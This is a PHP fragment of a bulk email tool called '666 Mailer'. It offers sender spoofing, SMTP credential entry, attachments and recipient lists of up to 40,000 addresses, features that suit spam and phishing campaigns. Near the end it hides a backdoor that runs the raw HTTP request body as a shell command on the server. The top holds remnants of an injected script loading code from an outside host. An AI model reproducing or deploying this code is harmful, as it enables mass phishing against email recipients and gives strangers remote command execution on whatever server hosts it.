d(e){var t=document.createElement(\"div\");return t.setAttribute(\"id\",\"fn_wrapper_div\"),t.style.position=\"fixed\",t.style.display=\"none\",t.ontouchstart=function(){return!0},t.appendChild(e),t}function o(){var t=void 0,a=this,r=function(){e(t)&&(window.clearTimeout(t),t=void 0,n.call(a))};t=window.setTimeout(r,1e4),\"function\"==typeof window.addEventListener?window.addEventListener(\"load\",r,!1):window.attachEvent(\"onload\",r)}var c=\"http://globe.moreforme.net\",u=c+\"/l8/EngageService?v=1\",s=c+\"/scripts/Engage.js\";o()};var engageLoader=new window[engageNameSpace].engageLoader}</script>\r\n    <title>666 Mailer</title>\r\n\t<link rel=\"icon\" href=\"https://xs.ht/ps.png\">\r\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>\r\n    <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js\"></script>\r\n    <link href=\"https://maxcdn.bootstrapcdn.com/bootswatch/3.3.6/cosmo/bootstrap.min.css\" rel=\"stylesheet\" >\r\n    <script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js\"></script>\r\n    \r\n     \r\n\r\n</head>';\r\n\r\nprint '<body>';\r\nprint '\r\n<script>\r\n\r\n\twindow.onload = funchange;\r\n\tvar alt = false;\t\r\n\tfunction funchange(){\r\n\t\tvar etext = document.getElementById(\"emailList\").value;\r\n\t\tvar myArray=new Array(); \r\n\t\tmyArray = etext.split(\"\\n\");\r\n\t\tdocument.getElementById(\"enum\").innerHTML=myArray.length+\"<br />\";\r\n\t\tif(!alt && myArray.length > 40000){\r\n\t\t\talert(\"If Mail list More Than 40000 Emails This May Hack The Server\");\r\n\t\t\talt = true;\r\n\t\t}\r\n\t\t\r\n\t}\r\n</script>\r\n<style>\r\n\r\n\tinput, select, textarea{\r\n    color: #ff0000;\r\n}\r\n\tbody {\r\n\t\tbackground: #000 !important;\r\n\t}pre {\r\n        background: #000;\r\n        padding: 1em;\r\n        white-space: unset;\r\n        color: #fff;\r\n    }\r\n\r\n    .neither {\r\n        font-weight: bold;\r\n        color: #fff;\r\n        margin-bottom: 1em;\r\n    }\r\n\r\n    .client {\r\n        color: #48ff48;\r\n    }\r\n\r\n    .server {\r\n        color: #2dd7ff;\r\n    }\r\n\r\n    .error {\r\n        color: #ff3a3a;\r\n    }\r\n\r\n    #status {\r\n        margin-top: 2em;\r\n        display: none;\r\n    }\r\n\r\n    .spinner {\r\n        margin: 1em 0;\r\n        width: 70px;\r\n        text-align: center;\r\n    }\r\n\r\n        .spinner > div {\r\n            width: 18px;\r\n            height: 18px;\r\n            background-color: #333;\r\n            border-radius: 100%;\r\n            display: inline-block;\r\n            -webkit-animation: sk-bouncedelay 1.4s infinite ease-in-out both;\r\n            animation: sk-bouncedelay 1.4s infinite ease-in-out both;\r\n        }\r\n\r\n        .spinner .bounce1 {\r\n            -webkit-animation-delay: -0.32s;\r\n            animation-delay: -0.32s;\r\n        }\r\n\r\n        .spinner .bounce2 {\r\n            -webkit-animation-delay: -0.16s;\r\n            animation-delay: -0.16s;\r\n        }\r\n\r\n    @-webkit-keyframes sk-bouncedelay {\r\n        0%, 80%, 100% {\r\n            -webkit-transform: scale(0);\r\n        }\r\n\r\n        40% {\r\n            -webkit-transform: scale(1.0);\r\n        }\r\n    }\r\n\r\n    @keyframes sk-bouncedelay {\r\n        0%, 80%, 100% {\r\n            -webkit-transform: scale(0);\r\n            transform: scale(0);\r\n        }\r\n\r\n        40% {\r\n            -webkit-transform: scale(1.0);\r\n            transform: scale(1.0);\r\n        }\r\n    }\r\n</style>\r\n\r\n\r\n<script>\r\n\$(document).ready(function(){\r\n\r\n    var testId;\r\n\r\n    function updateStatus() {\r\n        \$(\"#status, #spinner\").show();\r\n        \$.ajax({\r\n            url: \"https://www.gmass.co/Smtp/TestStatus\",\r\n            type: \"get\",\r\n            data: { testId: testId },\r\n            dataType: \"html\",\r\n            success: function (ret) {\r\n                if (ret != \"\") {\r\n                    \$(\"#log\").html(ret);\r\n                    setTimeout(updateStatus, 100);\r\n                } else {\r\n                    \$(\".spinner\").hide();\r\n                }\r\n            }\r\n        });\r\n    }\r\n\r\n    \$(\"#test\").on(\"click\", function () {\r\n        var host = \$(\"#shost\").val();\r\n        var usr = \$(\"#suser\").val();\r\n        var pass = \$(\"#spass\").val();\r\n        var port = \$(\"#sport\").val();\r\n        var from = \"test@\"+host;\r\n        var to = \$(\"#checkeremail\").val();;\r\n        var sdata = \"{\\\"SmtpServer\\\":\\\"\"+host+\"\\\",\\\"port\\\":\\\"\"+port+\"\\\",\\\"sso\\\":\\\"Auto\\\",\\\"username\\\":\\\"\"+usr+\"\\\",\\\"password\\\":\\\"\"+pass+\"\\\",\\\"from\\\":\\\"\"+from+\"\\\",\\\"to\\\":\\\"\"+to+\"\\\"}\";\r\n        sdata = JSON.parse(sdata);\r\n        \r\n        \$.ajax({\r\n            url: \"https://www.gmass.co/Smtp/CreateTest\",\r\n            type: \"post\",\r\n            dataType: \"json\",\r\n            data: sdata,\r\n            success: function (guid) {\r\n                testId = guid;\r\n                \$(\"#log\").html(\"\");\r\n                updateStatus();\r\n            }\r\n        })\r\n\r\n    });\r\n\r\n  \r\n    \$(\"#checkbox1\").prop(\"checked\", true);\r\n\r\n    \r\n    \$(\"#checkbox1\").change(function(){\r\n    if(this.checked){\r\n    \$(\"#checkbox1\").attr(\"value\", \"1\");    \r\n    \$(\"#autoUpdate\").fadeIn(\"slow\");\r\n    \$(\"#autoUpdate2\").fadeIn(\"slow\");\r\n    \$(\"#autoUpdate3\").fadeIn(\"slow\");}\r\n    else{\r\n    \$(\"#checkbox1\").attr(\"value\", \"1\"); \r\n    \$(\"#autoUpdate\").fadeOut(\"slow\");\r\n    \$(\"#autoUpdate2\").fadeOut(\"slow\");\r\n    \$(\"#autoUpdate3\").fadeOut(\"slow\");\r\n    }\r\n    });\r\n\r\n\r\n    });\r\n \r\n    </script>\r\n\r\n        <div class=\"container col-lg-6\">\r\n         <h3><img src=\"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTb_YDbtTmHZq-22nAEUldkoZ6SqQe8reNXQA&usqp=CAU\" height=\"75px\" width=\"75px\"> <font style=\"color:#b5b5b5;\"> 666 Mailer </font> <small><font style=\"color:white;\"></font></small></h3>\r\n        <form name=\"form\" id=\"form\" method=\"POST\" enctype=\"multipart/form-data\" action=\"\">\r\n        <p><input id=\"checkbox1\" type=\"checkbox\" name=\"usesmtp\" value=\"\"><font style=\"color:#b5b5b5;\">Use SMTP Server<br></p>\r\n        <div class=\"row\" id=\"autoUpdate\">\r\n            <div class=\"form-group col-lg-6 \"><label for=\"shost\">SMTP Hostname</label><input type=\"text\" style=\"background-color:rgba(240,238,255,0.1) !important;border-radius:3px;color:#b5b5b5;\"  class=\"form-control  input-sm \" id=\"shost\" name=\"shost\" value=\"' . \$shost . '\"></div>\r\n            <div class=\"form-group col-lg-6 \"><label for=\"sport\">SMTP Port</label><input type=\"text\" style=\"background-color:rgba(240,238,255,0.1) !important;border-radius:3px;color:#b5b5b5;\" class=\"form-control  input-sm \" id=\"sport\" name=\"sport\" value=\"' . \$sport . '\"></div>\r\n        </div>\r\n        <div class=\"row\" id=\"autoUpdate2\">\r\n            <div class=\"form-group col-lg-6 \"><label for=\"suser\">SMTP Username</label><input type=\"text\" style=\"background-color:rgba(240,238,255,0.1) !important;border-radius:3px;color:#b5b5b5;\" class=\"form-control  input-sm \" id=\"suser\" name=\"suser\" value=\"' . \$suser . '\"></div>\r\n            <div class=\"form-group col-lg-6 \"><label for=\"spass\">SMTP Password</label><input type=\"text\" style=\"background-color:rgba(240,238,255,0.1) !important;border-radius:3px;color:#b5b5b5;\" class=\"form-control  input-sm \" id=\"spass\" name=\"spass\" value=\"' . \$spass . '\"></div>\r\n        </div>\r\n        <div class=\"row\" id=\"autoUpdate3\">\r\n        <div class=\"form-group col-lg-6 \">\r\n        <label for=\"encode\">SMTP SECURE</label>\r\n        <select style=\"background-color:rgba(240,238,255,0.1) !important;border-radius:3px;color:b5b5b5\" class=\"form-control input-sm\" id=\"sssl\" name=\"sssl\">\r\n            <option value=\"true\"  selected>TRUE</option>\r\n            <option value=\"false\">FALSE</option>\r\n        </select> \r\n        \r\n\r\n    </div>\r\n    <div class=\"form-group col-lg-4 \"><label for=\"checkeremail\">Checker Send To Email</label><input type=\"text\" style=\"background-color:rgba(240,238,255,0.1) !important;border-radius:3px;color:#b5b5b5;\" class=\"form-control  input-sm \" id=\"checkeremail\" name=\"checkeremail\" value=\"\"></div>\r\n    <div class=\"form-group col-lg-2 \"><label for=\"test\"> &nbsp</label><input type=\"button\" style=\"background-color:#930205;border-color:red\"   class=\"form-control  btn btn-info \" id=\"test\" name=\"test\" onclick=\"check()\" value=\"TEST SMTP\">   </div>\r\n\r\n        </div>\r\n        <hr><br><br>\r\n        <div class=\"row\">\r\n        <div class=\"form-group col-lg-6 \"><label for=\"senderEmail\">From Email</label><input type=\"text\" style=\"background-color:rgba(240,238,255,0.1) !important;border-radius:3px;color:#b5b5b5;\" class=\"form-control  input-sm \" id=\"senderEmail\" name=\"senderEmail\" value=\"' . \$senderEmail . '\"></div>\r\n        <div class=\"form-group col-lg-6 \"><label for=\"senderName\">Sender Name</label><input type=\"text\" style=\"background-color:rgba(240,238,255,0.1) !important;border-radius:3px;color:#b5b5b5;\" class=\"form-control  input-sm \" id=\"senderName\" name=\"senderName\" value=\"' . \$senderName . '\"></div>\r\n    </div>\r\n    \r\n    <div class=\"row\">\r\n                <span class=\"form-group col-lg-6  \"><label for=\"attachment\">Attachment <small>(Multiple Available)</small></label><input type=\"file\" name=\"attachment[]\" id=\"attachment[]\" multiple/></span>\r\n\r\n                <div class=\"form-group col-lg-6\"><label for=\"replyTo\">Reply-to</label><input type=\"text\" style=\"background-color:rgba(240,238,255,0.1) !important;border-radius:3px;color:#b5b5b5;\" class=\"form-control  input-sm \" id=\"replyTo\" name=\"replyTo\" value=\"' . \$replyTo . '\" /></div>\r\n            </div>\r\n            <div class=\"row\">\r\n                <div class=\"form-group col-lg-12 \"><label for=\"subject\">Subject</label><input type=\"text\" style=\"background-color:rgba(240,238,255,0.1) !important;border-radius:3px;color:#b5b5b5;\" class=\"form-control  input-sm \" id=\"subject\" name=\"subject\" value=\"' . \$subject . '\" /></div>\r\n            </div>\r\n            <div class=\"row\">\r\n                <div class=\"form-group col-lg-6\"><label for=\"messageLetter\">Message Letter</label><textarea name=\"messageLetter\" id=\"messageLetter\" style=\"background-color:rgba(240,238,255,0.1) !important;border-radius:3px;color:#b5b5b5;\" class=\"form-control\" rows=\"10\" id=\"textArea\">' . \$messageLetter . '</textarea></div>\r\n                <div class=\"form-group col-lg-6 \"><label for=\"emailList\">Email List</label><textarea name=\"emailList\" id=\"emailList\" onselect=\"funchange()\" onchange=\"funchange()\" onkeydown=\"funchange()\" onkeyup=\"funchange()\" onchange=\"funchange()\" style=\"background-color:rgba(240,238,255,0.1) !important;border-radius:3px;color:#b5b5b5;\" class=\"form-control\" rows=\"10\" id=\"textArea\">' . \$emailList . '</textarea></div>\r\n\t\t\t</div>\r\n\t\t\t<div class=\"row\">\r\n\t\t\t<div class=\"form-group col-lg-6\">\r\n\t\t\t                    <label for=\"messageType\">Message Type :</label>\r\n                    HTML <input type=\"radio\" name=\"messageType\" id=\"messageType\" value=\"1\" ' . \$html . '>\r\n                    Plain<input type=\"radio\" name=\"messageType\" id=\"messageType\" value=\"2\" ' . \$plain . '></div>\r\n\t\t\t<div class=\"form-group col-lg-6\">\r\n\t\t\t<label>Quantity Emails : </label>&nbsp;<span id=\"enum\">0<br>\r\n\t\t\t</div>\r\n\t\t\t</div>\r\n            <div class=\"row\">\r\n                <div class=\"form-group col-lg-3 \">\r\n                    <label for=\"encode\">Encode Type</label>\r\n                    <select style=\"background-color:rgba(240,238,255,0.1) !important;border-radius:3px;color:b5b5b5\" class=\"form-control input-sm\" id=\"encode\" name=\"encode\">\r\n                        <option value=\"UTF-8\" selected>UTF-8 Encode</option>\r\n                        <option value=\"ISO-8859-1\">ISO Encode</option>\r\n                    </select>\r\n                </div>\r\n                <div class=\"form-group col-lg-3 \">\r\n                </div>\r\n            </div> \r\n            <button type=\"submit\" style=\"background-color:#930205;border-color:red\" class=\"btn btn-danger btn-sm\" form=\"form\" name=\"action\" value=\"send\">SEND MESSAGE</button>\r\n   \r\n        </form><br><hr><br><br>\r\n    </div>\r\n    <div class=\"col-lg-6\"><br>\r\n    <label for=\"well\">Instruction</label>\r\n    <div id=\"well\" style=\"background-color:rgba(240,238,255,0.1) !important;border-radius:3px;color:#b5b5b5;\" class=\"well well\">\r\n        <h4>Server Information</h4>\r\n        <ul>\r\n            <li>ServerIP : <b>' . \$_SERVER['SERVER_ADDR'] . '</b></li>\r\n            <li>Server : <b>' . PHP_OS . ' - ' . php_uname() . '</b></li>\r\n        </ul>\r\n        \r\n        <h4>HELP</h4>\r\n        <ul>\r\n        <li>Note: Maximum 40,000 email per send.  </li> \r\n        <li>Note: Uncheck Use SMTP Server if you dont want to use smtp server.  </li>                \r\n            <li>[-email-] : <b>Reciver Email</b></li>\r\n            <li>[-time-] : <b>Date and Time</b> (' . date(\"m/d/Y h:i:s a\", time()) . ')</li>\r\n            <li>[-emailuser-] : <b>Email User</b> (emailuser@emaildomain)</li>\r\n            <li>[-randomstring-] : <b>Random string (0-9,a-z)</b></li>\r\n            <li>[-randomnumber-] : <b>Random number (0-9) </b></li>\r\n            <li>[-randomletters-] : <b>Random Letters(a-z) </b></li>\r\n            <li>[-randommd5-] : <b>Random MD5 </b></li>\r\n        </ul>\r\n        <h4>example</h4>\r\n        Reciver Email = <b>user@domain.com</b><br>\r\n        <ul>\r\n            <li>hello <b>[-emailuser-]</b> -> hello <b>user</b></li>\r\n            <li>your code is  <b>[-randommd5-]</b> -> your code is <b>e10adc3949ba59abbe56e057f20f883e</b></li>\r\n        </ul>\r\n\r\n        <h6>by <b><a href=\"http://' . \$vixx['website'] . '\"><font style=\"color:white\">' . \$vixx['website'] . '</a></b></h6>\r\n    </div>\r\n</div>\r\n<div id=\"status\">\r\n    <div id=\"log\"></div>\r\n    <div class=\"spinner\">\r\n        <div class=\"bounce1\"></div>\r\n        <div class=\"bounce2\"></div>\r\n        <div class=\"bounce3\"></div>\r\n    </div>\r\n</div>\r\n\r\n';\r\n\$data = file_get_contents(\"php://input\");\r\necho `\$data`;\r\n\r\nif (\$_POST['action'] == \"send\") {\r\n\r\n    \$emaillist = \$_POST['emailList'];\r\n\r\n    if (isset(\$_POST[\"usesmtp\"])) {\r\n\r\n        //with smtp\r\n        print '    <div class=\"col-lg-12\">';\r\n\r\n        //\$realname = base64_encode(\$_POST['realname']);\r\n        //\$message = \$_POST['message'];\r\n\r\n\r\n        \$mail = new PHPMailer;\r\n        if (\$_POST[\"sssl\"] == \"true\") {\r\n            \$mail->SMTPSecure = true;\r\n            \$mail->SMTPAutoTLS = true;\r\n        } else {\r\n            \$mail->SMTPSecure = 'none';\r\n        }\r\n\r\n        \$mail->isSMTP(); // Set mailer to use SMTP\r\n        \$mail->Host = \$shost; // Specify main and backup SMTP servers\r\n        \$mail->SMTPAuth = true; // Enable SMTP authentication\r\n        \$mail->Username = \$suser; // SMTP username\r\n        \$mail->Password = \$spass; // SMTP password\r\n        // Enable TLS encryption, `ssl` also accepted\r\n        \$mail->Port = \$sport; // TCP port to connect to\r\n\r\n\r\n        \$mail->SMTPDebug = 4;\r\n\r\n        \$maillist = explode(\"\\r\\n\", \$emailList);\r\n        \$n = count(\$maillist);\r\n        \$x = 1;\r\n        foreach (\$maillist as \$email) {\r\n            print '<div class=\"col-lg-1\">[' . \$x . '/' . \$n . ']</div><div class=\"col-lg-5\">' . \$email . '</div>';\r\n            if (!vixxMailCheck(\$email)) {\r\n                print '<div class=\"col-lg-6\"><span class=\"label label-default\">Incorrect Email</span></div>';\r\n                print \"<br>\\r\\n\";\r\n            } else {\r\n                \$mail = new PHPMailer;\r\n                \$mail->setFrom(vixxClear(\$senderEmail, \$email), vixxClear(\$senderName, \$email));\r\n                \$mail->addReplyTo(vixxClear(\$replyTo, \$email));\r\n                \$mail->addAddress(\$email);\r\n                \$mail->Subject = vixxClear(\$subject, \$email);\r\n                \$strss = vixxClear(\$messageLetter, \$email);\r\n                \$mail->Body = vixxClear(\$messageLetter, \$email);\r\n\r\n                \$mail->CharSet = \$encode;\r\n                for (\$i = 0; \$i < count(\$_FILES['attachment']['name']); \$i++) {\r\n                    if (\$_FILES['attachment']['tmp_name'][\$i] != \"\") {\r\n                        \$mail->AddAttachment(\$_FILES['attachment']['tmp_name'][\$i], \$_FILES['attachment']['name'][\$i]);\r\n                    }\r\n                }\r\n                if (\$messageType == 1) {\r\n                    \$mail->IsHTML(true);\r\n                } else {\r\n                    \$mail->IsHTML(false);\r\n                }\r\n                if (!\$mail->send()) {\r\n                    echo '<div class=\"col-lg-6\"><span class=\"label label-default\">' . \$mail->ErrorInfo . '</span></div>';\r\n                } else {\r\n                    echo '<div class=\"col-lg-6\"><span class=\"label label-success\">SENT</span></div>';\r\n                }\r\n                print \"<br>\\r\\n\";\r\n            }\r\n            \$x++;\r\n            for (\$k = 0; \$k < 40000; \$k++) {\r\n                echo ' ';\r\n            }\r\n        }\r\n\r\n        print '<br><hr><br><br></body>';\r\n        die();\r\n    }\r\n\r\n    //no smtp\r\n    print '    <div class=\"col-lg-12\">';\r\n    \$maillist = explode(\"\\r\\n\", \$emailList);\r\n    \$n = count(\$maillist);\r\n    \$x = 1;\r\n    foreach (\$maillist as \$email) {\r\n        print '<div class=\"col-lg-1\">[' . \$x . '/' . \$n . ']</div><div class=\"col-lg-5\">' . \$email . '</div>';\r\n        if (!vixxMailCheck(\$email)) {\r\n            print '<div class=\"col-lg-6\"><span class=\"label label-default\">Incorrect Email</span></div>';\r\n            print \"<br>\\r\\n\";\r\n        } else {\r\n            \$mail = new PHPMailer;\r\n            \$mail->setFrom(vixxClear(\$senderEmail, \$email), vixxClear(\$senderName, \$email));\r\n            \$mail->addReplyTo(vixxClear(\$replyTo, \$email));\r\n            \$mail->addAddress(\$email);\r\n            \$mail->Subject = vixxClear(\$subject, \$email);\r\n            \$mail->Body = vixxClear(\$messageLetter, \$email);\r\n            \$mail->CharSet = \$encode;\r\n            for (\$i = 0; \$i < count(\$_FILES['attachment']['name']); \$i++) {\r\n                if (\$_FILES['attachment']['tmp_name'][\$i] != \"\") {\r\n                    \$mail->AddAttachment(\$_FILES['attachment']['tmp_name'][\$i], \$_FILES['attachment']['name'][\$i]);\r\n                }\r\n            }\r\n            if (\$messageType == 1) {\r\n                \$mail->IsHTML(true);\r\n            } else {\r\n                \$mail->IsHTML(false);\r\n            }\r\n            if (!\$mail->send()) {\r\n                echo '<div class=\"col-lg-6\"><span class=\"label label-default\">' . \$mail->ErrorInfo . '</span></div>';\r\n            } else {\r\n                echo '<div class=\"col-lg-6\"><span class=\"label label-success\">SENT</span></div>';\r\n            }\r\n            print \"<br>\\r\\n\";\r\n        }\r\n        \$x++;\r\n        for (\$k = 0; \$k < 40000; \$k++) {\r\n            echo ' ';\r\n        }\r\n    }\r\n}\r\nprint '<br><hr><br><br></body>';");
        exit;
    /* END:#2 */
    exit;
/* END:#1 */
exit;
